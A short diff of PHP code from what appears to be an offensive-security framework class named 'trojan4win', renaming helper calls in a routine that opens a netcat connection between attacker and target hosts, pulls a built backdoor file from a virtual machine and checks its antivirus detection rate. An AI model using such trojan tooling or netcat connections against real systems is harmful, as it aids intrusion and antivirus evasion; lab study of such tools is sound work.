@@ -24,9 +24,9 @@ class trojan4win extends inject4win{
         $this->cmd($this->attacker_ip,"nc $this->target_ip $this->attacker_port -v" );
         $this->pause();
         $vmx->vm2download("$this->vm_tmp_win\\$this->file_ext", "$this->file_path");
-        $this->file_file2virus2vt(); // 16/54
+        $this->file2virus2vt(); // 16/54
         $this->win2info();
-        //$this->file_file2sandbox("cuckoo1");
+        //$this->file2sandbox("cuckoo1");
         $this->note("plus d'Options pour le backdoor = + de detection pour les antivirus");
         return $this;
     }
